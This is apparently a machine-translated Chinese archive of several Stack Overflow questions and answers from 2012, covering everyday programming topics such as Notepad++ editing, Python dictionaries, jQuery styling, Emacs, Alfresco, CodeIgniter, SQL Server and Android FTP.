
## 回答 #3

> 赞同：5
> 
> 时间：2013-10-14T13:36:30.260

1.  将您的鼠标放在您列表中第一行的开头。
2.  按 Alt + "C"
3.  一个窗口被打开。在“要插入的文本”下输入您要添加的文本，然后按 OK。
4.  应用相同的过程在所有行的末尾添加文本。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-12-10T17:56:50.193

替换`\r`为`""\r`，使用扩展搜索模式（如果您的文件处于 UNIX 模式，您可以使用`\n`代替）。`\r`

要将其添加到每一行之后的新行，您可以替换`\r\n`为（或根据您的行尾`\r\n""\r\n`再次`\n`替换）。`\n""\n`

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2017-08-03T08:50:01.057

如果您不特别将 notepad++ 作为文本编辑器，请尝试使用[Atom](https://atom.io/)。它有一个[多光标](https://atom.io/packages/multi-cursor)选项，通过它您可以轻松地将文本添加到多行。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2018-07-18T02:30:48.987

另一种方式，你可以试试插件 ConyEdit。使用它的命令行在`cc.aal <yourContent>`您的内容后面附加行。顺便说一句，它可以将不同的文本附加到每一行（先将数据推送到数组，然后使用数组）。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2020-06-27T07:21:26.900

选择的答案在 Windows 上的 notepad++ 上对我不起作用，它只是在行尾附加了文本。这是有效的：

1.  打开搜索和替换框，在“查找内容”字段中添加“$”（表示行尾字符）
2.  在“替换为”字段使用中，\r - 这将在每行之后添加文本
3.  单击全部替换按钮以插入新行。

![检查上述步骤的屏幕截图](../Images/d1c201c56cdd95922e1514c279e96e49.png)

# python - 按值对二维字典进行反向排序

> ID：13806356
> 
> 赞同：0
> 
> 时间：2012-12-10T17:50:25.120
> 
> 标签：python, dictionary

我有以下格式的字典：

```
 d[1][2]= 0.3
 d[1][3] = 0.4
 d[2][8] = 0.2
 d[id1][id2] = value 
```

我想按值反向排序？

我的逻辑很冗长，感觉用python可以很快完成？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T17:53:19.390

这是不可能的。

字典将键映射到值。他们没有秩序的概念，所以你的问题没有多大意义。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-10T17:54:44.247

`sorted`与理解一起使用：

```
sorted((value, id1, id2) for id1, d1 in d.items() for id2, value in d1.items()) 
```

# javascript - 通过 jQuery 更改 iOS 输入占位符的样式属性

> ID：13806360
> 
> 赞同：2
> 
> 时间：2012-12-10T17:50:33.327
> 
> 标签：javascript, jquery, ios, css

对于其他浏览器，只需设置即可`#input-element { color: red; }`为输入的占位符文本 ( `<input type="text" placeholder="foo" />`) 着色。

但是，**iOS 上并非如此**；这需要以下内容（也许更合适，但仍然）：

```
#input-element::-webkit-input-placeholder { color: red; } 
```

好吧，那没问题。但是，我正在尝试使用 jQuery 来做到这一点，但没有取得多大成功。我尝试了以下方法：

```
$("#input-element::-webkit-input-placeholder").css('color', 'red');
$("#input-element").css('::-webkit-input-placeholder', 'color: red'); // not according to .css documentation: I'm aware 
```

然而，这些都没有任何改变。我试图避免将 (`$(head).append("<style>..");`样式直接附加到文档中。

**如何通过 jQuery 更改输入的占位符样式属性——保持 iOS 兼容性？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T11:09:45.087

为什么不直接切换 CSS 类？

CSS：

```
input[type=text]::-webkit-input-placeholder { color: red; }

.blue-pl::-webkit-input-placeholder {
    color: blue !important;
} 
```

JavaScript：

```
$('#input-element').click(function(){$(this).addClass('blue-pl'); }); 
```

这适用于我的 iOS 6 iPhone。

[jsFiddle 演示](http://jsfiddle.net/Vt99N/1/)

# c# - 用于非 Soap/JMS 消息的 IBM MQ 绑定元素

> ID：13806362
> 
> 赞同：4
> 
> 时间：2012-12-10T17:50:57.563
> 
> 标签：c#, .net, wcf, ibm-mq

我正在尝试读取 MQ 的消息，我一直在遵循[IBM 的这种方法](http://publib.boulder.ibm.com/infocenter/wmqv7/v7r0/topic/com.ibm.mq.csqzav.doc/un12064_.htm) 来创建“通过以编程方式提供绑定和端点信息的 WCF 自定义通道”。

我有一个与 SOAP 消息一起使用的类似机制，它有一个标头，指定要为每个传入消息调用的类和方法。

我现在想要处理来自另一个队列的不是 SOAP 格式的消息，但是我收到了这个错误；

> System.ServiceModel.CommunicationException: WCFCH0314E: 无法反序列化收到的消息“ID：...”消息格式或内容与所选消息编码器不一致，不能解释为 SOAP/JMS 消息。查看链接的异常以获取更多详细信息。---> System.ServiceModel.CommunicationException：无法识别的消息版本。

这是有道理的，因为该示例使用了 SoapJmsIbmTransportBindingElement。不幸的是，IBM.XMS.WCF 中似乎没有任何替代绑定元素。

是否可以为非肥皂消息的 MQ 创建 WCF 自定义通道？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T04:23:14.493

目前 MQ WCF 自定义通道仅支持 SOAP 消息，不支持非 SOAP 消息。MQ WCF 自定义通道查找特定的消息标头以将传入消息标识为 WCF 消息。如果这些标头不存在，则将引发 WCFCH0314E 异常。

# emacs - 终端内的 Emacs 动态更改光标颜色

> ID：13806363
> 
> 赞同：8
> 
> 时间：2012-12-10T17:50:58.193
> 
> 标签：emacs, terminal, elisp

我正在尝试将 Emacs 中光标的颜色动态更改为另一种颜色。

我正在使用`emacs -nw`终端 Emacs。我使用的终端是 Rxvt-Unicode (Urxvt)。

由于 Emacs 无法（我认为）对终端进行更改，`(set-cursor-color "red")`因此无法正常工作。为了更改终端的光标颜色，我可以运行 `echo -ne '\033]12;red\007'`. 这会将光标的颜色更改为红色。

我在 Emacs 中尝试做的是在其中运行这个命令。 `M-x shell-command RET echo -ne '\033]12;red\007' RET`

但是，Emacs 将转义回显的字符串并将其打印在窗口底部，而不实际对光标进行任何更改。

我真的不知道我还能从这里做什么，我不想使用 Emacs GUI。有谁知道解决这个问题的方法？我希望能够根据我当前的模式更改光标的颜色，这就是为什么它需要是动态的。如果有人有任何其他建议，我会很高兴听到他们的意见！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-11T02:18:46.697

我想你想用`send-string-to-terminal`.

例如`(send-string-to-terminal "\033]12;red\007")`。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-10T21:33:52.207

这是一个非常老套的解决方案——我希望有人能找到更好的解决方案：

```
(suspend-emacs "echo -ne '\\033]12;red\\007'; fg\n") 
```

它的工作原理是暂时挂起 emacs 进程并将命令填充到底层终端中，​​以使 shell 更改光标颜色并在此之后恢复 emacs。但是，这会导致屏幕闪烁，而 emacs 框架会暂时消失。

* * *

这是另一个非常hackish且依赖于系统的解决方案：

```
(shell-command (format "echo -ne '\\033]12;red\\007' > /proc/%d/fd/1" (emacs-pid))) 
```

它通过直接将 ANSI 转义序列发送到终端（通过`/proc/PID`伪文件系统访问）来工作（至少在 Linux 上）。我没有发现这个解决方案比前一个解决方案更优雅，但至少它不会使屏幕闪烁。

# createfile - 在 Alfresco 中使用 FileFolderService 创建文件时出错

> ID：13806366
> 
> 赞同：1
> 
> 时间：2012-12-10T17:51:08.133
> 
> 标签：createfile

我正在尝试在露天使用 FileFolderService 创建一个文件，但是我遇到了异常，下面提供了详细信息。所以任何人都可以帮助我！

站点名称：mysite 文件名：将作为请求参数传递，并在站点的文档库中创建具有传入值的新文件。

**代码片段：**

```
ServiceRegistry serviceRegistry = (ServiceRegistry) ctx.getBean("ServiceRegistry");
FileFolderService fileFolderService = serviceRegistry.getFileFolderService();
String fileName = req.getParameter("fileName");
NodeRef folder = new NodeRef("avm://mysite/-1;www;avm_webapps;ROOT;documentLibrary");
fileFolderService.create(folder, fileName, ContentModel.TYPE_CONTAINER); 
```

**抛出异常：**

```
ERROR [extensions.webscripts.AbstractRuntime] [http-bio-8080-exec-4] Exception from executeScript - redirecting to status template error: 11100002 Wrapped Exception (with status template): 11100016 Invalid node type for AVM.
 org.springframework.extensions.webscripts.WebScriptException: 11100002 Wrapped Exception (with status template): 11100016 Invalid node type for AVM.
    at org.springframework.extensions.webscripts.AbstractWebScript.createStatusException(AbstractWebScript.java:1067)
    at org.springframework.extensions.webscripts.DeclarativeWebScript.execute(DeclarativeWebScript.java:171)
    at org.alfresco.repo.web.scripts.RepositoryContainer$3.execute(RepositoryContainer.java:433)
    at org.alfresco.repo.transaction.RetryingTransactionHelper.doInTransaction(RetryingTransactionHelper.java:433)
    at org.alfresco.repo.web.scripts.RepositoryContainer.transactionedExecute(RepositoryContainer.java:495)
    at org.alfresco.repo.web.scripts.RepositoryContainer.transactionedExecuteAs(RepositoryContainer.java:533)
    at org.alfresco.repo.web.scripts.RepositoryContainer.executeScript(RepositoryContainer.java:349)
    at org.springframework.extensions.webscripts.AbstractRuntime.executeScript(AbstractRuntime.java:377)
    at org.springframework.extensions.webscripts.AbstractRuntime.executeScript(AbstractRuntime.java:209)
    at org.springframework.extensions.webscripts.servlet.WebScriptServlet.service(WebScriptServlet.java:118) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T14:35:16.963

您正在尝试使用类似 AVM 的路径访问 DM 存储库中的项目。如果您不了解两者之间的区别，那么我建议您阅读一些背景知识，例如*Professional Alfresco*书籍。

你可以尝试类似下面的代码，但我自己没有测试过。

```
String siteName = "blah", newFile = "My New File";
String path = "app:company_home/st:sites/cm:" + siteName + "/cm:documentLibrary";
List<String> pathElements = Arrays.asList(str.split("/"));
NodeRef rootNode = nodeService.getRootNode(new StoreRef("workspace", "SpacesStore"));
NodeRef dlNode = fileFolderService.resolveNamePath(rootNode, pathElements);
NodeRef newNode = fileFolderService.create(dlNode, newFile, ContentModel.TYPE_CONTENT).getNodeRef(); 
```

您将需要为节点设置一些属性和内容，但这至少会为您创建它。您可以在 Alfresco FirstFoundationClient SDK 项目中找到更多示例。

确切地注入对象的方式`nodeService`取决于`fileFolderService`代码在哪个容器中运行，但在 Java 支持的 Web 脚本的情况下，您可以通过 Spring 配置通过引用`NodeService`和`FileFolderService`bean 注入依赖项。`serviceRegistry`如果可以的话，尽量避免使用。

# php - 如何在 codeigniter 中获取当前月份（翻译）

> ID：13806370
> 
> 赞同：1
> 
> 时间：2012-12-10T17:51:26.357
> 
> 标签：php, codeigniter, date-format, lang

我刚刚安装了对 codeigniter 的翻译。

在我的控制器开始时，我设置了：

```
public function __construct()
{
   parent::__construct();
   $this->load->model('MyVeryFirst_model');
   $this->lang->load('calendar', 'polish');
   $this->load->helper('date');
} 
```

下一个功能

```
echo mdate(%F); 
```

它用英语显示月份，为什么？

```
echo $this->lang->line('cal_december');
echo timespan('1079621429', time()); 
```

用波兰语给我看名字，没关系。我已将语言环境设置为波兰语。

我做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T18:17:31.343

注意：这个函数（**timespan()**）生成的文本可以在以下语言文件中找到：language//date_lang.php 检查您在波兰语目录中的date_lang.php 并查看是否所有内容都被翻译为波兰语。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T21:00:32.977

我真的不知道为什么它不起作用，所以我使用了一些小技巧

```
$vars['today'] = date("d ").$this->lang->line("cal_".strtolower(date("F"))).date(" Y"); 
```

# python - TypeError：“函数”对象没有属性“__getitem__”

> ID：13806372
> 
> 赞同：11
> 
> 时间：2012-12-10T17:51:52.883
> 
> 标签：python, arrays, function

在 python 中编写一些代码来评估基本功能。我有一个包含一些值的二维数组，我想将该函数应用于每个值并获得一个新的二维数组：

```
import numpy as N
def makeGrid(dim):
    ''' Function to return a grid of distances from the centre of an array.
    This version uses loops to fill the array and is thus slow.'''
    tabx = N.arange(dim) - float(dim/2.0) + 0.5
    taby = N.arange(dim) - float(dim/2.0) + 0.5
    grid = N.zeros((dim,dim), dtype='float')
    for y in range(dim):
        for x in range(dim):
            grid[y,x] = N.sqrt(tabx[x]**2 + taby[y]**2)
    return grid

import math

def BigGrid(dim):
    l= float(raw_input('Enter a value for lambda: '))
    p= float(raw_input('Enter a value for phi: '))
    a = makeGrid 
    b= N.zeros ((10,10),dtype=float) #Create an array to take the returned values
    for i in range(10):
        for j in range (10):
            b[i][j] = a[i][j]*l*p
    return b

if __name__ == "__main__":
    ''' Module test code '''
    size = 10 #Dimension of the array
    newGrid = BigGrid(size)
    newGrid = N.round(newGrid, decimals=2)
    print newGrid 
```

但我得到的只是错误信息

```
Traceback (most recent call last):
  File "sim.py", line 31, in <module>
    newGrid = BigGrid(size)
  File "sim.py", line 24, in BigGrid
    b[i][j] = a[i][j]*l*p
TypeError: 'function' object has no attribute '__getitem__' 
```

请帮忙。

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-12-10T17:53:41.913

您似乎忘记了一对括号：

```
a = makeGrid(dim) 
```

你现在拥有的：

```
a = makeGrid 
```

只是给函数起别名`makeGrid`而不是调用它。然后，当您尝试对 进行索引时`a`，如下所示：

```
a[i] 
```

它试图索引到一个函数，该函数没有使用括号表示法进行索引所需的[神奇方法。](https://stackoverflow.com/questions/1090620/special-magic-methods-in-python)[`__getitem__`](http://docs.python.org/2/reference/datamodel.html#object.__getitem__)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-12-10T17:57:17.100

正如其他人所说，您需要正确调用 makeGrid .... 仅供参考，这是在 Python 中看到的一个相当常见的错误，它通常意味着您的变量不是您认为的类型（在此案例，你期待一个矩阵，但得到了一个函数）

```
TypeError: 'function' object has no attribute '__getitem__' 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-12-10T17:54:40.523

您不是在调用`makeGrid()`，而是将函数对象本身分配给`a`：

```
 a = makeGrid(dim) 
```

# javascript - 如何使用 YUI3 库：试图找到一个工作示例

> ID：13806374
> 
> 赞同：0
> 
> 时间：2012-12-10T17:52:06.013
> 
> 标签：javascript, yui3

我为 yui3 画廊找到了一个大型且结构良好的[github 存储](https://github.com/yui/yui3-gallery)库。然而，我惊讶地看到[里面](https://github.com/yui/yui3-gallery/tree/master/build/gallery-carousel-anim)`*.js`只有原始文件。我也访问过[官方网站](http://yuilibrary.com/gallery/show/carousel-anim)。大多数 examplead 都[非常旧](http://erisds.co.uk/resources/yui-carousel-demo-1)或已死。

我有一种感觉，我错过了一些东西。这么大的项目应该有一个工作演示页面，但我没有找到。如果我想尝试，我必须手动编译每个示例是否如此糟糕？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T16:36:07.187

您不是唯一一个对 YUI3 Gallery 感到有些沮丧的人，尽管您的表现比其他人最差，因为从您列出的链接中，您是通过后门进入的，即存储库，而不是实际的[登录页面](http://yuilibrary.com/gallery/)。

画廊中产品的质量非常多样化，并且没有评级。为了解决这个问题，几周后将提供一个新目录，该目录将对条目进行某种评级，以便更容易看到模块的好坏和维护情况。当然，这并不能保证任何旋转木马都能达到不错的评价，如果这是您需要的话。在那之前，如果你不能等待，你所能做的就是检查它们。

# c# - 网页内容的编码/解码问题

> ID：13806377
> 
> 赞同：0
> 
> 时间：2012-12-10T17:52:22.067
> 
> 标签：c#, encoding, decode

似乎我在处理我正在处理的网站内容时遇到了编码/解码问题。我从网上提取了一个 XML 文件，它可能有法语和德语字符，在“e”“r”等的汤姆上带有小撇号，但大部分内容都是英文的。当我尝试通过选择所有不同的单词来处理它们时，有时会在数据库中保存重复项。是否有任何我应该使用的编码/解码类/库，以便所有单词在一个编码/解码中都是统一的？我认为在我的情况下，即使这些词是英文的，看起来这两个相似的词是不同的编码，而 C# 相等运算符`==`由于编码不同而与这两个不匹配？

所以换句话说`"car" == "car"`可能因为编码不匹配？这甚至可能吗？我应该如何解决它？我应该使用解码所有内容吗？

更新：代码：下面的代码将检查单词是否存在，如果是则将其拉出，否则插入一个新单词。因此，应该始终将不同的单词输入数据库。

```
public static int GetWordID(string word)
{
    string _truncatedword = String.Empty;

    if (word.Length > 48)
    {
        _truncatedword = word.Substring(0, 47).Trim().ToLower();
    }
    else
    {
        _truncatedword = word.Trim().ToLower();
    }

    if (DWords.ContainsKey(_truncatedword))
    {
        return DWords[_truncatedword];
    }
    else
    {
        using (SqlConnection _connection = new SqlConnection(ConfigurationManager.ConnectionStrings["DatabaseConnectionString"].ConnectionString))
        {
            _connection.Open();

            SqlDataAdapter _adapter = new SqlDataAdapter("select wordid from word where word = @word", _connection);
            _adapter.SelectCommand.Parameters.AddWithValue("@word", _truncatedword);

            DataTable _dtWord = new DataTable();
            _adapter.Fill(_dtWord);

            if (_dtWord.Rows.Count > 0)
            {
                int _wordID = Convert.ToInt32(_dtWord.Rows[0]["wordid"]);

                DWords.Add(_truncatedword, _wordID);

                return _wordID;
            }
            else
            {
                SqlCommand _command = new SqlCommand("insert into word(word) values(@word); select @@identity", _connection);
                _command.Parameters.AddWithValue("@word", _truncatedword);

                int _wordID = Convert.ToInt32(_command.ExecuteScalar());

                DWords.Add(_truncatedword, _wordID);

                return _wordID;
            }
        }
    }
} 
```

# sql-server - 有没有办法让 sql server 作业在继续下一步之前等待 exe 完成

> ID：13806379
> 
> 赞同：1
> 
> 时间：2012-12-10T17:52:28.243
> 
> 标签：sql-server, tsql

我有一个包含三个步骤的 sql server 2005 作业。

1.  exec 存储过程 A
2.  运行exe
3.  执行存储过程 B

我想在执行第 3 步之前等待 exe 完成。有没有简单的方法可以做到这一点？

最糟糕的是，我可以编写一个执行以下操作的 EXE：

```
 myLinqDataContext.executeProcedureA
   Dim p as process = Process.run(path to exe from step 2)
   p.waitforexit
   myLinqDataContext.executeProcedureB 
```

但我想知道是否有更好的方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T17:57:10.750

默认情况下，作业步骤将等到 EXE 完成并返回。

但是请注意，某些 EXE 是异步的（或者更有可能是异步启动另一个 EXE/副本），因此即使它们尚未完成，它们也会返回给调用者。您需要禁用此行为或查找/编写其他内容来监视它并仅在它退出时返回。

# css - 色带溢出效应问题

> ID：13806382
> 
> 赞同：1
> 
> 时间：2012-12-10T17:52:40.783
> 
> 标签：css, wordpress, ribbon

我正在 wordpress 中创建自定义主题。我找到了一个代码，可以在侧边栏上的项目标题周围获得丝带效果。但是，色带并没有完全流过侧边栏的边缘，而是位于侧边栏的中间，当我将标题向右浮动时，部分色带会被隐藏。我一直在用谷歌浏览器“检查元素”方面来玩它，但似乎不能让它工作。我应该怎么办？网站链接：gamedaymeetup.com

```
 h1.widget-title {
    text-align: center;
    position: relative;
    color: #fff;    
    margin: 0 -30px 30px -30px;
    padding: 10px 0; 
    text-shadow: 0 1px rgba(0,0,0,.8);
    background: #5c5c5c;
    background-image: -moz-linear-gradient(rgba(255,255,255,.3), rgba(255,255,255,0));
    background-image: -webkit-linear-gradient(rgba(255,255,255,.3), rgba(255,255,255,0));
    background-image: -o-linear-gradient(rgba(255,255,255,.3), rgba(255,255,255,0));
    background-image: -ms-linear-gradient(rgba(255,255,255,.3), rgba(255,255,255,0));
    background-image:  linear-gradient(rgba(255,255,255,.3), rgba(255,255,255,0));
    -moz-box-shadow: 0 2px 0 rgba(0,0,0,.3);
    -webkit-box-shadow: 0 2px 0 rgba(0,0,0,.3);
    box-shadow: 0 2px 0 rgba(0,0,0,.3); 
```

}

```
h1.widget-title:before, h1:after
{
    content: '';
    position: absolute;
    border-style: solid;
    border-color: transparent;
    bottom: -10px;
}

h1.widget-title:after
{
    border-width: 0 0 10px 10px;
    border-left-color: #222;
    right: 0;
} 
```

这是侧边栏的样式

```
#sidebar {
text-align: left;
display: block;
padding: 9px;
float: right;
width: 246px;
height: 100%;
font-family: "Gotham SSm A", "Gotham SSm B", Arial, sans-serif;
font-size: 13px;
line-height: 16px;
letter-spacing: .2px;
background-color: #FFF;
background-position: bottom;
color: #000;
border-left-width: 1px;
border-left-style: inset;
border-left-color: #C3C3C3; 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-30T20:33:46.380

我将从 CSS Tricks 中 Chris Coyier 的功能区 css 开始：http: [//css-tricks.com/snippets/css/ribbon/](http://css-tricks.com/snippets/css/ribbon/)

他根据我所看到的情况解决了大多数边缘情况。我在制作中使用它，并没有太大问题。

# jquery - 如何使用 jQuery 在网页上验证可变数量的开始和结束日期

> ID：13806384
> 
> 赞同：0
> 
> 时间：2012-12-10T17:52:54.813
> 
> 标签：jquery

我正在使用 jquery 验证开始日期小于结束日期。如果我知道开始和结束日期元素的数量，它就可以工作。但我的问题是在我的表格中可能有很多开始和结束日期。我应该怎么做，例如下面给出的。

```
Start Date <input type="text" id="t1_sdate_0">
End date <input type="text" id="t1_edate_0">  

Start Date <input type="text" id="t1_sdate_1">
End date <input type="text" id="t1_edate_1">

Start Date <input type="text" id="t2_sdate_0">
End date <input type="text" id="t2_edate_0">  

Start Date <input type="text" id="t2_sdate_1">
End date <input type="text" id="t2_edate_1"> 
```

我想做类似下面的事情

```
 $('#sDate').datepicker(
                {gotoCurrent: true, changeMonth: true, changeYear: true, dateFormat: 'dd-M-yy', yearRange: '1850:2050',maxDate:'0'
                ,
                 onSelect: function(selected) {
                    $("#eDate").datepicker("option","minDate", selected);
                }});

        $('#eDate').datepicker(
                {gotoCurrent: true, changeMonth: true, changeYear: true, dateFormat: 'dd-M-yy', yearRange: '1850:2050',maxDate:'0'
                ,
                 onSelect: function(selected) {
                    $("#sDate").datepicker("option","maxDate", selected);
                }}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T20:47:32.673

虽然我没有遇到使用 jQuery 的 each() 函数的性能问题，但在某些情况下它[的性能较差](http://www.developer.nokia.com/Community/Wiki/JavaScript_Performance_Best_Practices)。

考虑以下函数：

```
function Validate(){
    var arr = $("input[id*=sdate]");
    for(var i = 0; i< arr.length; i++)
    {
        var splittedId = arr[i].id.split('_');
        var matchingInput = $('input[id*=edate_' + splittedId[splittedId.length - 1] + ']');
        if (Date.parse($(arr[i]).val()) > Date.parse(matchingInput.val()))
                return false;
    }
    return true;
} 
```

该实现对另一个答案有两个优点。第一个是它独立于 DOM 元素位置，这意味着您仍然可以在一对匹配的输入之间添加元素而不会失去功能（可扩展性）。其次，如果日期输入的数量很少，您可能不会注意到，但在相当极端的情况下，例如 1000 个输入，此实现返回第一个无效输入对，并且性能差异可能不会被忽视。

[在此处](http://jsfiddle.net/a0viedo/R7MRJ/)检查实现。

快乐编码！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T17:58:39.707

尝试这个 ：

```
function Validate(){
      var isVallid = true;

    $("input[id*=sdate]").each(function(){          
            var nextInput = $(this).next();   
            console.log(nextInput);
            if (Date.parse($(this).val()) > Date.parse(nextInput.val()))
                  isVallid  = false;
      });

    return isVallid ;
} 
```

检查[演示](http://jsfiddle.net/rpKF8/4/)

# blackberry-cascades - Blackbeery 10 级联 NavigationPane

> ID：13806387
> 
> 赞同：0
> 
> 时间：2012-12-10T17:53:03.670
> 
> 标签：blackberry-cascades

我有一个带有导航窗格的登录页面，当用户成功登录时，我应该重定向到 main.qml 文件，而单击 ii 不能从 signin.qml 文件转到 main.qml 文件？如何做到这一点任何人都可以给我建议`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T05:36:35.770

您只能在文档中找到有关 NavigationPane 和其他控件的所有信息。

[导航窗格文档](https://developer.blackberry.com/cascades/reference/bb__cascades__navigationpane.html)

这很简单。您应该正确地完成一次，然后自己试一试。

看看下面显示的代码段，你应该明白了。

```
NavigationPane {
    id: navigationPane
    Page {
        attachedObjects: ComponentDefinition {
            id: pageDefinition
            source: "main.qml"
        }
        Container {
            Button {
                text: "Login"
                onClicked: {
                    //check if credentials are valid or not
                    if(isValidUser())
                    {
                        var page = pageDefinition.createObject();
                        navigationPane.push(page);
                    }
                    else
                    {
                        //show error message
                    }
                }
            }
        }
    }
} 
```

# java - Android FTP 拒绝连接到主机

> ID：13806394
> 
> 赞同：0
> 
> 时间：2012-12-10T17:53:25.157
> 
> 标签：java, android, ftp

我一直在尝试构建一个应用程序，该应用程序从用户那里捕获一些数据项，然后继续将其全部压缩成一个 zip 文件并通过 FTP 传输到服务器。压缩部分很有魅力，我相信 FTP 也会如此，只是程序拒绝连接到主机。

我已经尝试了所有的排列和组合来解决这个问题，但一直无法意识到问题所在。我已经包含了 apache commons net 库，并且能够将错误定位到连接部分。大部分代码已被注释掉，以便只允许使用其中的一部分。

我的代码是`package com.example.gis;

```
import java.io.FileInputStream;

import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.ftp.FTPReply;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

public class FTP extends Activity {

public static FTPClient mFTPClient = null;
public String TAG="1234";
public static String a;
public static String b;
//public static int abc=FTP.BINARY_FILE_TYPE; 
public void onCreate(Bundle savedInstanceState)
{
super.onCreate(savedInstanceState);
setContentView(R.layout.ftp);

Bundle extras = getIntent().getExtras();
boolean m=ftpConnect("ftp://xxxxxxxxxx.xxx", "username omitted", "password omitted", 21);
if(m==true)
{
    Toast.makeText(this,"FTP Login" , Toast.LENGTH_LONG).show();

a=extras.getString("path");
b=extras.getString("name");
ftpUpload("a", "b", "/test/");
ftpDisconnect();

}
else
    Toast.makeText(this,"Failure to connect" , Toast.LENGTH_LONG).show();
}

public boolean ftpConnect(String host, String username,
        String password, int port)
{
    mFTPClient=new FTPClient();

try {

// connecting to the host
mFTPClient.connect(host, port);

// now check the reply code, if positive mean connection success
if (FTPReply.isPositiveCompletion(mFTPClient.getReplyCode())) {
// login using username & password
boolean status = mFTPClient.login(username, password);
Toast.makeText(this,"Connected as status ="+status, Toast.LENGTH_LONG).show();
/* Set File Transfer Mode
*
* To avoid corruption issue you must specified a correct
* transfer mode, such as ASCII_FILE_TYPE, BINARY_FILE_TYPE,
* EBCDIC_FILE_TYPE .etc. Here, I use BINARY_FILE_TYPE
* for transferring text, image, and compressed files.
*/
mFTPClient.setFileType(abc);

mFTPClient.enterLocalPassiveMode();

return status;
}
} catch(Exception e) {
Log.d(TAG, "Error: could not connect to host " + host );
}

return false;
}

public boolean ftpDisconnect()
{
    try {
        mFTPClient.logout();
        mFTPClient.disconnect();
        return true;
    } catch (Exception e) {
        Log.d(TAG, "Error occurred while disconnecting from ftp server.");
    }

    return false;
}

/**
 * mFTPClient: FTP client connection object (see FTP connection example)
 * srcFilePath: source file path in sdcard
 * desFileName: file name to be stored in FTP server
 * desDirectory: directory path where the file should be upload to
 */
public boolean ftpUpload(String srcFilePath, String desFileName,
                         String desDirectory)
{
    boolean status = false;
    try {
        FileInputStream srcFileStream = new FileInputStream(srcFilePath);

        // change working directory to the destination directory
        if (ftpChangeDirectory(desDirectory)) {
            status = mFTPClient.storeFile(desFileName, srcFileStream);
        }

        srcFileStream.close();
        return status;
    } catch (Exception e) {
        Log.d(TAG, "upload failed");
    }

    return status;
}

} 
```

已经有一段时间了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T19:46:38.513

```
boolean m=ftpConnect("ftp://xxxxxxxxxx.xxx", ... 
```

您正在使用 ftp:// 指定协议。你不应该那样做。您只需指定服务器（或主机），如“ftp.mycompany.com”。

此外，如果您尝试连接，则必须分别捕获 SocketException、UnknownHostException 和 IOException。通过打印堆栈跟踪，您将知道导致错误的原因。我看你没有那样做。

作为最后一句话，我看到你在主线程上做这个互联网访问。我知道这对于 ftp 是可能的（为什么对于 ftp 而不是对于 http？）但是您最好使用线程或异步任务。

# sql-server - 是否可以从 INFORMATION_SCHEMA 获取表类型定义？

> ID：13806395
> 
> 赞同：20
> 
> 时间：2012-12-10T17:53:27.950
> 
> 标签：sql-server, tsql, sql-server-2008-r2

我知道用户定义的类型存储在 中`information_schema.domains`，但是否可以获得类型的定义`table type`？

要清楚，我正在寻找实际的表类型定义：

例如，我想获取列定义`myTableType`

```
CREATE TYPE myTableType AS TABLE(
     Id INT,
     SomeValue NVARCHAR(20)
); 
```

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2012-12-10T17:59:50.833

要获取用户定义表类型的列列表，请运行此命令。您需要将您的表名替换为`some_table_type`：

```
SELECT *
FROM sys.columns
WHERE object_id IN (
  SELECT type_table_object_id
  FROM sys.table_types
  WHERE name = 'some_table_type'
); 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2014-04-08T18:26:36.620

获取用户定义的表类型的表类型、列和数据类型的列表。

```
select tt.name AS table_Type, c.name AS table_Type_col_name,st.name AS   
table_Type_col_datatype
from sys.table_types tt
inner join sys.columns c on c.object_id = tt.type_table_object_id
INNER JOIN sys.systypes AS ST  ON ST.xtype = c.system_type_id 
```

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2015-12-21T22:03:38.630

获取列名、其类型和可空性的详细信息：

```
SELECT tt.name     AS Table_Type,
  c.name           AS Column_Name,
  st.name          AS Datatype, 
  CASE WHEN st.name = 'numeric' THEN '(' + Convert(varchar(5), c.precision) + ',' + Convert(varchar(5), c.scale) + ')' 
  WHEN st.name IN ('char', 'nchar', 'varchar', 'nvarchar') THEN '(' + Convert(varchar(5), c.max_length) + ')' 
  ELSE '' END      AS Size,
  CASE WHEN c.is_nullable = 0 THEN 'NOT NULL,'
  ELSE ',' END     AS Nullable
FROM sys.table_types tt
  INNER JOIN sys.columns c ON c.object_id = tt.type_table_object_id
  INNER JOIN sys.systypes st ON (st.xusertype = c.system_type_id AND st.uid = 4)
ORDER BY tt.name, c.column_id 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2017-04-11T07:09:21.690

使用 Management Studio 还可以访问自定义/用户定义表类型的可视化表示，就像使用常规表一样。

不同之处在于用户定义的表出现在对象资源管理器的***可编程性***节点下，如下所示，而不是在***Tables***下：

[![自定义用户定义表类型](../Images/944a7abb43783fe52a5089bd3de25283.png)](https://i.stack.imgur.com/HHESJ.png)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-04-14T18:11:26.197

